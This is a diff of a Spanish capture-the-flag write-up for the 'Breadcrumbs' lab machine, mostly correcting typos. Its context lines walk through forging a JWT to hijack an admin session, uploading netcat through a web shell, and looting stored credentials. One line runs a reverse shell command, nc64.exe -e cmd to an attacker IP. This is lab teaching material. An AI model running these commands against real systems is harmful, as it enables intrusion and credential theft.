@@ -137,7 +137,7 @@ Funciona, voy a probar otra ruta `/includes/bookController.php`
 ![imagen-de-prueba](/assets/img/breadcrumbs/bookcontroller.png)
 _breadcrumbs_
 
-Vemos que tenemos capcidad de leer los archivos `.php` , busquemos mas rutas que tengan archivos php, profundicemos en las rutas que encontramo antes, apliquemos wfuzz a la ruta `portal` , pero que muestre si hay archivos php
+Vemos que tenemos capacidad de leer los archivos `.php` , busquemos mas rutas que tengan archivos php, profundicemos en las rutas que encontramos antes, apliquemos wfuzz a la ruta `portal` , pero que muestre si hay archivos php
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/cookiefuzz.png)
 _breadcrumbs_
@@ -162,7 +162,7 @@ Ejecutamos un bucle con el archivo, y vemos que nos crea `PHPSESSID` que tenemos
 ![imagen-de-prueba](/assets/img/breadcrumbs/norandon.png)
 _breadcrumbs_
 
-En este punto ya tenemos una forma de crear `PHPSESSID` , fata encontrar la calve secreta para crear el JWT.
+En este punto ya tenemos una forma de crear `PHPSESSID` , falta encontrar la calve secreta para crear el JWT.
 
 Seguiremos aplicando wfuzz en la ruta `portal` econtramos otra ruta llamada `includes` vamos a ver si contiene archivos php.
 
@@ -175,13 +175,11 @@ miremos el archivo `fileController.php`
 ![imagen-de-prueba](/assets/img/breadcrumbs/secreckey.png)
 _breadcrumbs_
 
-`fileController.php` contiene la clave secreta para el JWT y mas bajo vemos el mensaje de `privilegios insuficientes`, ya con esto podemos crear el un JWT y secuetrar la session de `paul` que es un usuario administrador `activo`.
+`fileController.php` contiene la clave secreta para el JWT y mas bajo vemos el mensaje de `privilegios insuficientes`, ya con esto podemos crear un JWT y secuetrar la session de `paul` que es un usuario administrador `activo`.
 
-![imagen-de-prueba](/assets/img/breadcrumbs/clave.png)
-_breadcrumbs_
 
 # Cookie Hijacking
-Teniendo el token de el usuario `test` el cookie.php para generar `PHPSESSID` y la clave secreta, vamos a secuestrar la sesion de `paul` vamos a https://jwt.io 
+Teniendo el token del usuario `test` el cookie.php para generar `PHPSESSID` y la clave secreta, vamos a secuestrar la sesion de `paul` vamos a https://jwt.io 
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/token2.png)
 _breadcrumbs_
@@ -232,7 +230,7 @@ Vamos a subir `nc64.exe` a la maquina victima para establecer una revershell.
 ![imagen-de-prueba](/assets/img/breadcrumbs/shell1.png)
 _breadcrumbs_
 
-Ahora ejecutamo el binario.
+Ahora ejecutamos el binario.
 
 ````bash
 >http://10.10.10.228/portal/uploads/prueba.php?cmd=cmd.exe /c C:\Windows\Temp\nc64.exe -e cmd 10.10.14.7 443
@@ -245,12 +243,12 @@ Estamos dentro de la maquina con el ususario `www-data` , enumerando el usuario 
 ![imagen-de-prueba](/assets/img/breadcrumbs/whoami1.png)
 _breadcrumbs_
 
-Buscando en los directorios encuentro uno llamado `pizzaDeliveryUserData` que me llama la atecnion veamos que contiene.
+Buscando en los directorios encuentro uno llamado `pizzaDeliveryUserData` veamos que contiene.
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/pizza.png)
 _breadcrumbs_
 
-Dentro hay archivos con nombres de ususarios y uno llamado `juliette.json` , si le hago un type al archivo vemos que contiene un username:`juliette` y un password.
+Dentro hay archivos con nombres de usuarios y uno llamado `juliette.json` , si le hago un type al archivo vemos que contiene un username:`juliette` y un password.
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/type1.png)
 _breadcrumbs_
@@ -291,12 +289,12 @@ Voy a descargarlo a mi maquina para analizarlo en local con `smbserver`.
 >smbserver.py smbFolder $(pwd) -smb2support
 `````
 
-En local ejecuto un `strings` al archivo y encuentro unas credenciales para el usuarion `development` .
+En local ejecuto un `strings` al archivo y encuentro unas credenciales para el usuario `development` .
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/dev2.png)
 _breadcrumbs_
 
-Compruebo si las credenciales son valias y usare ssh de nuevo.
+Compruebo si las credenciales son validas y usare ssh de nuevo.
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/dev4.png)
 _breadcrumbs_
@@ -316,7 +314,7 @@ El archivo esta copilado en linux si lo ejecutamos vemos algo de informcaion.
 ![imagen-de-prueba](/assets/img/breadcrumbs/dev7.png)
 _breadcrumbs_
 
-Si le ejecuto un  `strings` ecuentro una `url` que apunta aun puero `1234` que no esta expuesto, pero si miramos dentro de la maquina con `netstat -nat` vemos que si esta.
+Si ejecuto un  `strings` ecuentro una `url` que apunta aun puerto `1234` que no esta expuesto, pero si miramos dentro de la maquina con `netstat -nat` vemos que si esta.
 
 ![imagen-de-prueba](/assets/img/breadcrumbs/url1.png)
 _breadcrumbs_
